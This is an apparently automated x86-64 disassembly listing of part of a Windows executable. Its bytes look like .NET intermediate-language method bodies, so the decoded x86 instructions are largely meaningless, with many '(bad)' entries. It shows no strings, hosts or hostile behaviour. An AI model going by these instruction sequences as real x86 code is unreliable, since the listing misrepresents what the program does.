   14000832c:	00 00                	add    %al,(%rax)
   14000832e:	04 15                	add    $0x15,%al
   140008330:	fe 01                	incb   (%rcx)
   140008332:	d2 2a                	shrb   %cl,(%rdx)
   140008334:	03 30                	add    (%rax),%esi
   140008336:	01 00                	add    %eax,(%rax)
   140008338:	2c 00                	sub    $0x0,%al
   14000833a:	00 00                	add    %al,(%rax)
   14000833c:	36 00 00             	ss add %al,(%rax)
   14000833f:	11 28                	adc    %ebp,(%rax)
   140008341:	a2 00 00 06 2c 07 7e 	movabs %al,0x767e072c060000
   140008348:	76 00 
   14000834a:	00 04 2c             	add    %al,(%rsp,%rbp,1)
   14000834d:	15 28 a3 00 00       	adc    $0xa328,%eax
   140008352:	06                   	(bad)
   140008353:	2c 12                	sub    $0x12,%al
   140008355:	7e 7c                	jle    0x1400083d3
   140008357:	00 00                	add    %al,(%rax)
   140008359:	04 2d                	add    $0x2d,%al
   14000835b:	0b 7e 90             	or     -0x70(%rsi),%edi
   14000835e:	00 00                	add    %al,(%rax)
   140008360:	04 2d                	add    $0x2d,%al
   140008362:	04 17                	add    $0x17,%al
   140008364:	0a 2b                	or     (%rbx),%ch
   140008366:	02 16                	add    (%rsi),%dl
   140008368:	0a 06                	or     (%rsi),%al
   14000836a:	d2 2a                	shrb   %cl,(%rdx)
   14000836c:	03 30                	add    (%rax),%esi
   14000836e:	01 00                	add    %eax,(%rax)
   140008370:	06                   	(bad)
   140008371:	00 00                	add    %al,(%rax)
   140008373:	00 00                	add    %al,(%rax)
   140008375:	00 00                	add    %al,(%rax)
   140008377:	00 7e 74             	add    %bh,0x74(%rsi)
   14000837a:	00 00                	add    %al,(%rax)
   14000837c:	04 2a                	add    $0x2a,%al
   14000837e:	cc                   	int3
   14000837f:	cc                   	int3
   140008380:	03 30                	add    (%rax),%esi
   140008382:	02 00                	add    (%rax),%al
   140008384:	0d 00 00 00 00       	or     $0x0,%eax
   140008389:	00 00                	add    %al,(%rax)
   14000838b:	00 7e 8c             	add    %bh,-0x74(%rsi)
   14000838e:	00 00                	add    %al,(%rax)
   140008390:	04 16                	add    $0x16,%al
   140008392:	6a 28                	push   $0x28
   140008394:	9f                   	lahf
   140008395:	00 00                	add    %al,(%rax)
   140008397:	06                   	(bad)
   140008398:	2a cc                	sub    %ah,%cl
   14000839a:	cc                   	int3
   14000839b:	cc                   	int3
   14000839c:	03 30                	add    (%rax),%esi
   14000839e:	00 00                	add    %al,(%rax)
   1400083a0:	06                   	(bad)
   1400083a1:	00 00                	add    %al,(%rax)
   1400083a3:	00 00                	add    %al,(%rax)
   1400083a5:	00 00                	add    %al,(%rax)
   1400083a7:	00 28                	add    %ch,(%rax)
   1400083a9:	94                   	xchg   %eax,%esp
   1400083aa:	00 00                	add    %al,(%rax)
   1400083ac:	06                   	(bad)
   1400083ad:	2a cc                	sub    %ah,%cl
   1400083af:	cc                   	int3
   1400083b0:	03 30                	add    (%rax),%esi
   1400083b2:	01 00                	add    %eax,(%rax)
   1400083b4:	2b 00                	sub    (%rax),%eax
   1400083b6:	00 00                	add    %al,(%rax)
   1400083b8:	00 00                	add    %al,(%rax)
   1400083ba:	00 00                	add    %al,(%rax)
   1400083bc:	28 90 00 00 06 16    	sub    %dl,0x16060000(%rax)
   1400083c2:	80 76 00 00          	xorb   $0x0,0x0(%rsi)
   1400083c6:	04 7e                	add    $0x7e,%al
   1400083c8:	79 00                	jns    0x1400083ca
   1400083ca:	00 04 2c             	add    %al,(%rsp,%rbp,1)
   1400083cd:	11 28                	adc    %ebp,(%rax)
   1400083cf:	ef                   	out    %eax,(%dx)
   1400083d0:	00 00                	add    %al,(%rax)
   1400083d2:	06                   	(bad)
   1400083d3:	16                   	(bad)
   1400083d4:	80 90 00 00 04 16 80 	adcb   $0x80,0x16040000(%rax)
   1400083db:	79 00                	jns    0x1400083dd
   1400083dd:	00 04 16             	add    %al,(%rsi,%rdx,1)
   1400083e0:	80 7c 00 00 04       	cmpb   $0x4,0x0(%rax,%rax,1)
   1400083e5:	16                   	(bad)
   1400083e6:	2a cc                	sub    %ah,%cl
   1400083e8:	03 30                	add    (%rax),%esi
   1400083ea:	02 00                	add    (%rax),%al
   1400083ec:	2a 00                	sub    (%rax),%al
   1400083ee:	00 00                	add    %al,(%rax)
   1400083f0:	00 00                	add    %al,(%rax)
   1400083f2:	00 00                	add    %al,(%rax)
   1400083f4:	28 a5 00 00 06 2c    	sub    %ah,0x2c060000(%rbp)
   1400083fa:	22 28                	and    (%rax),%ch
   1400083fc:	53                   	push   %rbx
   1400083fd:	00 00                	add    %al,(%rax)
   1400083ff:	0a 28                	or     (%rax),%ch
   140008401:	52                   	push   %rdx
   140008402:	00 00                	add    %al,(%rax)
   140008404:	0a 2c 0a             	or     (%rdx,%rcx,1),%ch
   140008407:	16                   	(bad)
   140008408:	6a 28                	push   $0x28
   14000840a:	b6 00                	mov    $0x0,%dh
   14000840c:	00 06                	add    %al,(%rsi)
   14000840e:	26 2b 0c 7e          	es sub (%rsi,%rdi,2),%ecx
   140008412:	8d 00                	lea    (%rax),%eax
   140008414:	00 04 16             	add    %al,(%rsi,%rdx,1)
   140008417:	6a 28                	push   $0x28
   140008419:	9f                   	lahf
   14000841a:	00 00                	add    %al,(%rax)
   14000841c:	06                   	(bad)
   14000841d:	2a cc                	sub    %ah,%cl
   14000841f:	cc                   	int3
   140008420:	03 30                	add    (%rax),%esi
   140008422:	02 00                	add    (%rax),%al
   140008424:	2f                   	(bad)
   140008425:	00 00                	add    %al,(%rax)
   140008427:	00 00                	add    %al,(%rax)
   140008429:	00 00                	add    %al,(%rax)
   14000842b:	00 7e 78             	add    %bh,0x78(%rsi)
   14000842e:	00 00                	add    %al,(%rax)
   140008430:	04 2c                	add    $0x2c,%al
   140008432:	27                   	(bad)
   140008433:	7f 6d                	jg     0x1400084a2
   140008435:	00 00                	add    %al,(%rax)
   140008437:	04 17                	add    $0x17,%al
   140008439:	28 37                	sub    %dh,(%rdi)
   14000843b:	00 00                	add    %al,(%rax)
   14000843d:	0a 2d 1a 7f 77 00    	or     0x777f1a(%rip),%ch        # 0x14078035d
   140008443:	00 04 28             	add    %al,(%rax,%rbp,1)
   140008446:	35 00 00 0a 16       	xor    $0x160a0000,%eax
   14000844b:	fe 01                	incb   (%rcx)
   14000844d:	28 b5 00 00 06 d2    	sub    %dh,-0x2dfa0000(%rbp)
   140008453:	2c 05                	sub    $0x5,%al
   140008455:	28 b7 00 00 06 2a    	sub    %dh,0x2a060000(%rdi)
   14000845b:	cc                   	int3
   14000845c:	03 30                	add    (%rax),%esi
   14000845e:	02 00                	add    (%rax),%al
   140008460:	18 00                	sbb    %al,(%rax)
   140008462:	00 00                	add    %al,(%rax)
   140008464:	77 00                	ja     0x140008466
   140008466:	00 11                	add    %dl,(%rcx)
   140008468:	12 00                	adc    (%rax),%al
   14000846a:	02 4c 28 06          	add    0x6(%rax,%rbp,1),%cl
   14000846e:	00 00                	add    %al,(%rax)
   140008470:	0a 06                	or     (%rsi),%al
   140008472:	28 3b                	sub    %bh,(%rbx)
   140008474:	00 00                	add    %al,(%rax)
   140008476:	0a 0b                	or     (%rbx),%cl
   140008478:	12 01                	adc    (%rcx),%al
   14000847a:	28 2b                	sub    %ch,(%rbx)
   14000847c:	00 00                	add    %al,(%rax)
   14000847e:	0a 2a                	or     (%rdx),%ch
   140008480:	03 30                	add    (%rax),%esi
   140008482:	02 00                	add    (%rax),%al
   140008484:	1a 00                	sbb    (%rax),%al
   140008486:	00 00                	add    %al,(%rax)
   140008488:	77 00                	ja     0x14000848a
   14000848a:	00 11                	add    %dl,(%rcx)
   14000848c:	12 00                	adc    (%rax),%al
   14000848e:	02 4c 28 06          	add    0x6(%rax,%rbp,1),%cl
   140008492:	00 00                	add    %al,(%rax)
   140008494:	0a 06                	or     (%rsi),%al
   140008496:	28 3b                	sub    %bh,(%rbx)
   140008498:	00 00                	add    %al,(%rax)
   14000849a:	0a 0b                	or     (%rbx),%cl
   14000849c:	12 01                	adc    (%rcx),%al
   14000849e:	03 28                	add    (%rax),%ebp
   1400084a0:	2c 00                	sub    $0x0,%al
   1400084a2:	00 0a                	add    %cl,(%rdx)
   1400084a4:	02 2a                	add    (%rdx),%ch
   1400084a6:	cc                   	int3
   1400084a7:	cc                   	int3
   1400084a8:	03 30                	add    (%rax),%esi
   1400084aa:	02 00                	add    (%rax),%al
   1400084ac:	1c 00                	sbb    $0x0,%al
   1400084ae:	00 00                	add    %al,(%rax)
   1400084b0:	77 00                	ja     0x1400084b2
   1400084b2:	00 11                	add    %dl,(%rcx)
   1400084b4:	12 00                	adc    (%rax),%al
   1400084b6:	02 4c 28 06          	add    0x6(%rax,%rbp,1),%cl
   1400084ba:	00 00                	add    %al,(%rax)
   1400084bc:	0a 06                	or     (%rsi),%al
   1400084be:	28 3b                	sub    %bh,(%rbx)
   1400084c0:	00 00                	add    %al,(%rax)
   1400084c2:	0a 0b                	or     (%rbx),%cl
   1400084c4:	12 01                	adc    (%rcx),%al
   1400084c6:	28 28                	sub    %ch,(%rax)
   1400084c8:	00 00                	add    %al,(%rax)
   1400084ca:	0a 02                	or     (%rdx),%al
   1400084cc:	16                   	(bad)
   1400084cd:	6a 55                	push   $0x55
   1400084cf:	2a 03                	sub    (%rbx),%al
   1400084d1:	30 02                	xor    %al,(%rdx)
   1400084d3:	00 17                	add    %dl,(%rdi)
   1400084d5:	00 00                	add    %al,(%rax)
   1400084d7:	00 4a 00             	add    %cl,0x0(%rdx)
   1400084da:	00 11                	add    %dl,(%rcx)
   1400084dc:	14 28                	adc    $0x28,%al
   1400084de:	27                   	(bad)
   1400084df:	00 00                	add    %al,(%rax)
   1400084e1:	0a 28                	or     (%rax),%ch
   1400084e3:	3c 00                	cmp    $0x0,%al
   1400084e5:	00 0a                	add    %cl,(%rdx)
   1400084e7:	0a 02                	or     (%rdx),%al
   1400084e9:	12 00                	adc    (%rax),%al
   1400084eb:	28 31                	sub    %dh,(%rcx)
   1400084ed:	00 00                	add    %al,(%rax)
   1400084ef:	0a 55 02             	or     0x2(%rbp),%dl
   1400084f2:	2a cc                	sub    %ah,%cl
   1400084f4:	03 30                	add    (%rax),%esi
   1400084f6:	03 00                	add    (%rax),%eax
   1400084f8:	10 00                	adc    %al,(%rax)
   1400084fa:	00 00                	add    %al,(%rax)
   1400084fc:	00 00                	add    %al,(%rax)
   1400084fe:	00 00                	add    %al,(%rax)
   140008500:	02 03                	add    (%rbx),%al
   140008502:	04 28                	add    $0x28,%al
   140008504:	00 01                	add    %al,(%rcx)
   140008506:	00 06                	add    %al,(%rsi)
   140008508:	02 05 28 05 01 00    	add    0x10528(%rip),%al        # 0x140018a36
   14000850e:	06                   	(bad)
   14000850f:	2a 03                	sub    (%rbx),%al
   140008511:	30 03                	xor    %al,(%rbx)
   140008513:	00 0e                	add    %cl,(%rsi)
   140008515:	00 00                	add    %al,(%rax)
   140008517:	00 00                	add    %al,(%rax)
   140008519:	00 00                	add    %al,(%rax)
   14000851b:	00 72 4d             	add    %dh,0x4d(%rdx)
   14000851e:	00 00                	add    %al,(%rax)
   140008520:	70 02                	jo     0x140008524
   140008522:	03 73 03             	add    0x3(%rbx),%esi
   140008525:	01 00                	add    %eax,(%rax)
   140008527:	06                   	(bad)
   140008528:	7a 2a                	jp     0x140008554
   14000852a:	cc                   	int3
   14000852b:	cc                   	int3
   14000852c:	03 30                	add    (%rax),%esi
   14000852e:	02 00                	add    (%rax),%al
   140008530:	2a 00                	sub    (%rax),%al
   140008532:	00 00                	add    %al,(%rax)
   140008534:	7a 00                	jp     0x140008536
   140008536:	00 11                	add    %dl,(%rcx)
   140008538:	02 28                	add    (%rax),%ch
   14000853a:	58                   	pop    %rax
   14000853b:	00 00                	add    %al,(%rax)
   14000853d:	0a 02                	or     (%rdx),%al
   14000853f:	fe 06                	incb   (%rsi)
   140008541:	0b 01                	or     (%rcx),%eax
   140008543:	00 06                	add    %al,(%rsi)
   140008545:	73 48                	jae    0x14000858f
   140008547:	00 00                	add    %al,(%rax)
   140008549:	0a 0a                	or     (%rdx),%cl
   14000854b:	28 53 00             	sub    %dl,0x0(%rbx)
   14000854e:	00 0a                	add    %cl,(%rdx)
   140008550:	06                   	(bad)
   140008551:	6f                   	outsl  (%rsi),(%dx)
   140008552:	56                   	push   %rsi
   140008553:	00 00                	add    %al,(%rax)
   140008555:	0a 28                	or     (%rax),%ch
   140008557:	53                   	push   %rbx
   140008558:	00 00                	add    %al,(%rax)
   14000855a:	0a 06                	or     (%rsi),%al
   14000855c:	6f                   	outsl  (%rsi),(%dx)
   14000855d:	55                   	push   %rbp
   14000855e:	00 00                	add    %al,(%rax)
   140008560:	0a 2a                	or     (%rdx),%ch
   140008562:	cc                   	int3
   140008563:	cc                   	int3
   140008564:	03 30                	add    (%rax),%esi
   140008566:	02 00                	add    (%rax),%al
   140008568:	28 00                	sub    %al,(%rax)
   14000856a:	00 00                	add    %al,(%rax)
   14000856c:	00 00                	add    %al,(%rax)
   14000856e:	00 00                	add    %al,(%rax)
   140008570:	02 72 6d             	add    0x6d(%rdx),%dh
   140008573:	02 00                	add    (%rax),%al
   140008575:	70 28                	jo     0x14000859f
   140008577:	bf 00 00 06 26       	mov    $0x26060000,%edi
   14000857c:	17                   	(bad)
   14000857d:	80 7b 00 00          	cmpb   $0x0,0x0(%rbx)
   140008581:	04 7f                	add    $0x7f,%al
   140008583:	85 00                	test   %eax,(%rax)
   140008585:	00 04 7f             	add    %al,(%rdi,%rdi,2)
   140008588:	80 00 00             	addb   $0x0,(%rax)
   14000858b:	04 28                	add    $0x28,%al
   14000858d:	c5 00 00             	(bad)
   140008590:	06                   	(bad)
   140008591:	18 80 7b 00 00 04    	sbb    %al,0x400007b(%rax)
   140008597:	2a 03                	sub    (%rbx),%al
   140008599:	30 02                	xor    %al,(%rdx)
   14000859b:	00 12                	add    %dl,(%rdx)
   14000859d:	00 00                	add    %al,(%rax)
   14000859f:	00 00                	add    %al,(%rax)
   1400085a1:	00 00                	add    %al,(%rax)
   1400085a3:	00 02                	add    %al,(%rdx)
   1400085a5:	72 e7                	jb     0x14000858e
   1400085a7:	02 00                	add    (%rax),%al
   1400085a9:	70 28                	jo     0x1400085d3
   1400085ab:	bf 00 00 06 26       	mov    $0x26060000,%edi
   1400085b0:	28 a6 00 00 06 2a    	sub    %ah,0x2a060000(%rsi)
   1400085b6:	cc                   	int3
   1400085b7:	cc                   	int3
   1400085b8:	03 30                	add    (%rax),%esi
   1400085ba:	02 00                	add    (%rax),%al
   1400085bc:	81 00 00 00 00 00    	addl   $0x0,(%rax)
   1400085c2:	00 00                	add    %al,(%rax)
   1400085c4:	02 72 92             	add    -0x6e(%rdx),%dh
   1400085c7:	03 00                	add    (%rax),%eax
   1400085c9:	70 28                	jo     0x1400085f3
   1400085cb:	bf 00 00 06 26       	mov    $0x26060000,%edi
   1400085d0:	28 f1                	sub    %dh,%cl
   1400085d2:	00 00                	add    %al,(%rax)
   1400085d4:	06                   	(bad)
   1400085d5:	17                   	(bad)
   1400085d6:	80 7c 00 00 04       	cmpb   $0x4,0x0(%rax,%rax,1)
   1400085db:	28 a0 00 00 06 2d    	sub    %ah,0x2d060000(%rax)
   1400085e1:	05 28 f0 00 00       	add    $0xf028,%eax
   1400085e6:	06                   	(bad)
   1400085e7:	7e 90                	jle    0x140008579
   1400085e9:	00 00                	add    %al,(%rax)
   1400085eb:	04 17                	add    $0x17,%al
   1400085ed:	33 05 28 f0 00 00    	xor    0xf028(%rip),%eax        # 0x14001761b
   1400085f3:	06                   	(bad)
   1400085f4:	7e 90                	jle    0x140008586
   1400085f6:	00 00                	add    %al,(%rax)
   1400085f8:	04 2d                	add    $0x2d,%al
   1400085fa:	49 17                	rex.WB (bad)
   1400085fc:	80 6f 00 00          	subb   $0x0,0x0(%rdi)
   140008600:	04 17                	add    $0x17,%al
   140008602:	80 90 00 00 04 7f 93 	adcb   $0x93,0x7f040000(%rax)
   140008609:	00 00                	add    %al,(%rax)
   14000860b:	04 7f                	add    $0x7f,%al
   14000860d:	8f 00                	pop    (%rax)
   14000860f:	00 04 28             	add    %al,(%rax,%rbp,1)
   140008612:	c2 00 00             	ret    $0x0
   140008615:	06                   	(bad)
   140008616:	2c 0b                	sub    $0xb,%al
   140008618:	02 28                	add    (%rax),%ch
   14000861a:	be 00 00 06 28       	mov    $0x28060000,%esi
   14000861f:	98                   	cwtl
   140008620:	00 00                	add    %al,(%rax)
   140008622:	06                   	(bad)
   140008623:	7f 92                	jg     0x1400085b7
   140008625:	00 00                	add    %al,(%rax)
   140008627:	04 7f                	add    $0x7f,%al
   140008629:	95                   	xchg   %eax,%ebp
   14000862a:	00 00                	add    %al,(%rax)
   14000862c:	04 28                	add    $0x28,%al
   14000862e:	c3                   	ret
   14000862f:	00 00                	add    %al,(%rax)
   140008631:	06                   	(bad)
   140008632:	18 80 90 00 00 04    	sbb    %al,0x4000090(%rax)
   140008638:	17                   	(bad)
   140008639:	80 79 00 00          	cmpb   $0x0,0x0(%rcx)
   14000863d:	04 18                	add    $0x18,%al
   14000863f:	80 6f 00 00          	subb   $0x0,0x0(%rdi)
   140008643:	04 2a                	add    $0x2a,%al
   140008645:	cc                   	int3
   140008646:	cc                   	int3
   140008647:	cc                   	int3
   140008648:	03 30                	add    (%rax),%esi
   14000864a:	02 00                	add    (%rax),%al
   14000864c:	34 00                	xor    $0x0,%al
   14000864e:	00 00                	add    %al,(%rax)
   140008650:	00 00                	add    %al,(%rax)
   140008652:	00 00                	add    %al,(%rax)
   140008654:	02 72 0c             	add    0xc(%rdx),%dh
   140008657:	04 00                	add    $0x0,%al
   140008659:	70 28                	jo     0x140008683
   14000865b:	bf 00 00 06 26       	mov    $0x26060000,%edi
   140008660:	17                   	(bad)
   140008661:	80 7d 00 00          	cmpb   $0x0,0x0(%rbp)
   140008665:	04 28                	add    $0x28,%al
   140008667:	91                   	xchg   %eax,%ecx
   140008668:	00 00                	add    %al,(%rax)
   14000866a:	06                   	(bad)
   14000866b:	26 7f 87             	es jg  0x1400085f5
   14000866e:	00 00                	add    %al,(%rax)
   140008670:	04 7f                	add    $0x7f,%al
   140008672:	7f 00                	jg     0x140008674
   140008674:	00 04 28             	add    %al,(%rax,%rbp,1)
   140008677:	c5 00 00             	(bad)
   14000867a:	06                   	(bad)
   14000867b:	18 80 7d 00 00 04    	sbb    %al,0x400007d(%rax)
   140008681:	17                   	(bad)
   140008682:	80 76 00 00          	xorb   $0x0,0x0(%rsi)
   140008686:	04 2a                	add    $0x2a,%al
   140008688:	03 30                	add    (%rax),%esi
   14000868a:	02 00                	add    (%rax),%al
   14000868c:	2e 00 00             	cs add %al,(%rax)
   14000868f:	00 00                	add    %al,(%rax)
   140008691:	00 00                	add    %al,(%rax)
   140008693:	00 02                	add    %al,(%rdx)
   140008695:	72 88                	jb     0x14000861f
   140008697:	04 00                	add    $0x0,%al
   140008699:	70 28                	jo     0x1400086c3
   14000869b:	bf 00 00 06 26       	mov    $0x26060000,%edi
   1400086a0:	17                   	(bad)
   1400086a1:	80 73 00 00          	xorb   $0x0,0x0(%rbx)
   1400086a5:	04 28                	add    $0x28,%al
   1400086a7:	93                   	xchg   %eax,%ebx
   1400086a8:	00 00                	add    %al,(%rax)
   1400086aa:	06                   	(bad)
   1400086ab:	26 7f 82             	es jg  0x140008630
   1400086ae:	00 00                	add    %al,(%rax)
   1400086b0:	04 7f                	add    $0x7f,%al
   1400086b2:	83 00 00             	addl   $0x0,(%rax)
   1400086b5:	04 28                	add    $0x28,%al
   1400086b7:	c5 00 00             	(bad)
   1400086ba:	06                   	(bad)
   1400086bb:	18 80 73 00 00 04    	sbb    %al,0x4000073(%rax)
   1400086c1:	2a cc                	sub    %ah,%cl
   1400086c3:	cc                   	int3
   1400086c4:	03 30                	add    (%rax),%esi
   1400086c6:	02 00                	add    (%rax),%al
   1400086c8:	1e                   	(bad)
   1400086c9:	00 00                	add    %al,(%rax)
   1400086cb:	00 00                	add    %al,(%rax)
   1400086cd:	00 00                	add    %al,(%rax)
   1400086cf:	00 02                	add    %al,(%rdx)
   1400086d1:	72 08                	jb     0x1400086db
   1400086d3:	05 00 70 28 bf       	add    $0xbf287000,%eax
   1400086d8:	00 00                	add    %al,(%rax)
   1400086da:	06                   	(bad)
   1400086db:	26 14 fe             	es adc $0xfe,%al
   1400086de:	06                   	(bad)
   1400086df:	b8 00 00 06 73       	mov    $0x73060000,%eax
   1400086e4:	48 00 00             	rex.W add %al,(%rax)
   1400086e7:	0a 28                	or     (%rax),%ch
   1400086e9:	9a                   	(bad)
   1400086ea:	00 00                	add    %al,(%rax)
   1400086ec:	06                   	(bad)
   1400086ed:	2a cc                	sub    %ah,%cl
   1400086ef:	cc                   	int3
   1400086f0:	0b 30                	or     (%rax),%esi
   1400086f2:	04 00                	add    $0x0,%al
   1400086f4:	b9 00 00 00 7c       	mov    $0x7c000000,%ecx
   1400086f9:	00 00                	add    %al,(%rax)
   1400086fb:	11 28                	adc    %ebp,(%rax)
   1400086fd:	53                   	push   %rbx
   1400086fe:	00 00                	add    %al,(%rax)
   140008700:	0a 28                	or     (%rax),%ch
   140008702:	52                   	push   %rdx
   140008703:	00 00                	add    %al,(%rax)
   140008705:	0a 80 7a 00 00 04    	or     0x400007a(%rax),%al
   14000870b:	7e 7a                	jle    0x140008787
   14000870d:	00 00                	add    %al,(%rax)
   14000870f:	04 2c                	add    $0x2c,%al
   140008711:	06                   	(bad)
   140008712:	17                   	(bad)
   140008713:	80 74 00 00 04       	xorb   $0x4,0x0(%rax,%rax,1)
   140008718:	28 ee                	sub    %ch,%dh
   14000871a:	00 00                	add    %al,(%rax)
   14000871c:	06                   	(bad)
   14000871d:	13 04 16             	adc    (%rsi,%rdx,1),%eax
   140008720:	0d 16 0a 16 0b       	or     $0xb160a16,%eax
   140008725:	28 41 00             	sub    %al,0x0(%rcx)
   140008728:	00 0a                	add    %cl,(%rdx)
   14000872a:	06                   	(bad)
   14000872b:	2d 31 de 20 7f       	sub    $0x7f20de31,%eax
   140008730:	91                   	xchg   %eax,%ecx
   140008731:	00 00                	add    %al,(%rax)
   140008733:	04 11                	add    $0x11,%al
   140008735:	04 16                	add    $0x16,%al
   140008737:	6a 28                	push   $0x28
   140008739:	38 00                	cmp    %al,(%rax)
   14000873b:	00 0a                	add    %cl,(%rdx)
   14000873d:	0c 08                	or     $0x8,%al
   14000873f:	2d 04 17 0a 2b       	sub    $0x2b0a1704,%eax
   140008744:	09 08                	or     %ecx,(%rax)
   140008746:	11 04 33             	adc    %eax,(%rbx,%rsi,1)
   140008749:	04 17                	add    $0x17,%al
   14000874b:	0d 17 0a dc 06       	or     $0x6dc0a17,%eax
   140008750:	2d 0a 20 e8 03       	sub    $0x3e8200a,%eax
   140008755:	00 00                	add    %al,(%rax)
   140008757:	28 d9                	sub    %bl,%cl
   140008759:	00 00                	add    %al,(%rax)
   14000875b:	06                   	(bad)
   14000875c:	2b cc                	sub    %esp,%ecx
   14000875e:	02 28                	add    (%rax),%ch
   140008760:	ae                   	scas   (%rdi),%al
   140008761:	00 00                	add    %al,(%rax)
   140008763:	06                   	(bad)
   140008764:	7e 7a                	jle    0x1400087e0
   140008766:	00 00                	add    %al,(%rax)
   140008768:	04 2c                	add    $0x2c,%al
   14000876a:	0e                   	(bad)
   14000876b:	02 28                	add    (%rax),%ch
   14000876d:	b0 00                	mov    $0x0,%al
   14000876f:	00 06                	add    %al,(%rsi)
   140008771:	02 28                	add    (%rax),%ch
   140008773:	b1 00                	mov    $0x0,%cl
   140008775:	00 06                	add    %al,(%rsi)
   140008777:	2b 0d 28 a4 00 00    	sub    0xa428(%rip),%ecx        # 0x140012ba5
   14000877d:	06                   	(bad)
   14000877e:	16                   	(bad)
   14000877f:	33 03                	xor    (%rbx),%eax
   140008781:	07                   	(bad)
   140008782:	2b 01                	sub    (%rcx),%eax
   140008784:	17                   	(bad)
   140008785:	0b de                	or     %esi,%ebx
   140008787:	11 09                	adc    %ecx,(%rcx)
   140008789:	2d 0d 7f 91 00       	sub    $0x917f0d,%eax
   14000878e:	00 04 16             	add    %al,(%rsi,%rdx,1)
   140008791:	6a 28                	push   $0x28
   140008793:	36 00 00             	ss add %al,(%rax)
   140008796:	0a 26                	or     (%rsi),%ah
   140008798:	dc 07                	faddl  (%rdi)
   14000879a:	2c 06                	sub    $0x6,%al
   14000879c:	02 28                	add    (%rax),%ch
   14000879e:	af                   	scas   (%rdi),%eax
   14000879f:	00 00                	add    %al,(%rax)
   1400087a1:	06                   	(bad)
   1400087a2:	02 28                	add    (%rax),%ch
   1400087a4:	b2 00                	mov    $0x0,%dl
   1400087a6:	00 06                	add    %al,(%rsi)
   1400087a8:	17                   	(bad)
   1400087a9:	80 78 00 00          	cmpb   $0x0,0x0(%rax)
   1400087ad:	04 02                	add    $0x2,%al
   1400087af:	28 b3 00 00 06 2a    	sub    %dh,0x2a060000(%rbx)
   1400087b5:	00 00                	add    %al,(%rax)
   1400087b7:	00 41 34             	add    %al,0x34(%rcx)
   1400087ba:	00 00                	add    %al,(%rax)
   1400087bc:	02 00                	add    (%rax),%al
   1400087be:	00 00                	add    %al,(%rax)
   1400087c0:	31 00                	xor    %eax,(%rax)
   1400087c2:	00 00                	add    %al,(%rax)
   1400087c4:	02 00                	add    (%rax),%al
   1400087c6:	00 00                	add    %al,(%rax)
   1400087c8:	33 00                	xor    (%rax),%eax
   1400087ca:	00 00                	add    %al,(%rax)
   1400087cc:	20 00                	and    %al,(%rax)
   1400087ce:	00 00                	add    %al,(%rax)
   1400087d0:	46 00 00             	rex.RX add %r8b,(%rax)
   1400087d3:	01 02                	add    %eax,(%rdx)
   1400087d5:	00 00                	add    %al,(%rax)
   1400087d7:	00 2e                	add    %ch,(%rsi)
   1400087d9:	00 00                	add    %al,(%rax)
   1400087db:	00 5e 00             	add    %bl,0x0(%rsi)
   1400087de:	00 00                	add    %al,(%rax)
   1400087e0:	8c 00                	mov    %es,(%rax)
   1400087e2:	00 00                	add    %al,(%rax)
   1400087e4:	11 00                	adc    %eax,(%rax)
   1400087e6:	00 00                	add    %al,(%rax)
   1400087e8:	46 00 00             	rex.RX add %r8b,(%rax)
   1400087eb:	01 0b                	add    %ecx,(%rbx)
   1400087ed:	30 04 00             	xor    %al,(%rax,%rax,1)
   1400087f0:	33 00                	xor    (%rax),%eax
   1400087f2:	00 00                	add    %al,(%rax)
   1400087f4:	7d 00                	jge    0x1400087f6
   1400087f6:	00 11                	add    %dl,(%rcx)
   1400087f8:	7f 77                	jg     0x140008871
   1400087fa:	00 00                	add    %al,(%rax)
   1400087fc:	04 28                	add    $0x28,%al
   1400087fe:	35 00 00 0a 16       	xor    $0x160a0000,%eax
   140008803:	fe 01                	incb   (%rcx)
   140008805:	d2 0b                	rorb   %cl,(%rbx)
   140008807:	28 b5 00 00 06 07    	sub    %dh,0x7060000(%rbp)
   14000880d:	2c 05                	sub    $0x5,%al
   14000880f:	28 b7 00 00 06 de    	sub    %dh,-0x21fa0000(%rdi)
   140008815:	14 0a                	adc    $0xa,%al
   140008817:	03 06                	add    (%rsi),%eax
   140008819:	28 97 00 00 06 de    	sub    %dl,-0x21fa0000(%rdi)
   14000881f:	0a 0c 03             	or     (%rbx,%rax,1),%cl
   140008822:	14 28                	adc    $0x28,%al
   140008824:	97                   	xchg   %eax,%edi
   140008825:	00 00                	add    %al,(%rax)
   140008827:	06                   	(bad)
   140008828:	de 00                	fiadds (%rax)
   14000882a:	2a 00                	sub    (%rax),%al
   14000882c:	41 34 00             	rex.B xor $0x0,%al
	...
   140008837:	00 1e                	add    %bl,(%rsi)
   140008839:	00 00                	add    %al,(%rax)
   14000883b:	00 1e                	add    %bl,(%rsi)
   14000883d:	00 00                	add    %al,(%rax)
   14000883f:	00 0a                	add    %cl,(%rdx)
   140008841:	00 00                	add    %al,(%rax)
   140008843:	00 30                	add    %dh,(%rax)
   140008845:	00 00                	add    %al,(%rax)
   140008847:	01 00                	add    %eax,(%rax)
   140008849:	00 00                	add    %al,(%rax)
   14000884b:	00 00                	add    %al,(%rax)
   14000884d:	00 00                	add    %al,(%rax)
   14000884f:	00 1e                	add    %bl,(%rsi)
   140008851:	00 00                	add    %al,(%rax)
   140008853:	00 28                	add    %ch,(%rax)
   140008855:	00 00                	add    %al,(%rax)
   140008857:	00 0a                	add    %cl,(%rdx)
   140008859:	00 00                	add    %al,(%rax)
   14000885b:	00 03                	add    %al,(%rbx)
   14000885d:	00 00                	add    %al,(%rax)
   14000885f:	01 03                	add    %eax,(%rbx)
   140008861:	30 01                	xor    %al,(%rcx)
   140008863:	00 09                	add    %cl,(%rcx)
   140008865:	00 00                	add    %al,(%rax)
   140008867:	00 00                	add    %al,(%rax)
   140008869:	00 00                	add    %al,(%rax)
   14000886b:	00 02                	add    %al,(%rdx)
   14000886d:	28 c1                	sub    %al,%cl
   14000886f:	00 00                	add    %al,(%rax)
   140008871:	06                   	(bad)
   140008872:	26 02 2a             	es add (%rdx),%ch
   140008875:	00 00                	add    %al,(%rax)
   140008877:	00 03                	add    %al,(%rbx)
   140008879:	30 01                	xor    %al,(%rcx)
   14000887b:	00 07                	add    %al,(%rdi)
   14000887d:	00 00                	add    %al,(%rax)
   14000887f:	00 00                	add    %al,(%rax)
   140008881:	00 00                	add    %al,(%rax)
   140008883:	00 02                	add    %al,(%rdx)
   140008885:	28 c0                	sub    %al,%al
   140008887:	00 00                	add    %al,(%rax)
   140008889:	06                   	(bad)
   14000888a:	2a 00                	sub    (%rax),%al
   14000888c:	0b 30                	or     (%rax),%esi
   14000888e:	04 00                	add    $0x0,%al
   140008890:	63 00                	movsxd (%rax),%eax
   140008892:	00 00                	add    %al,(%rax)
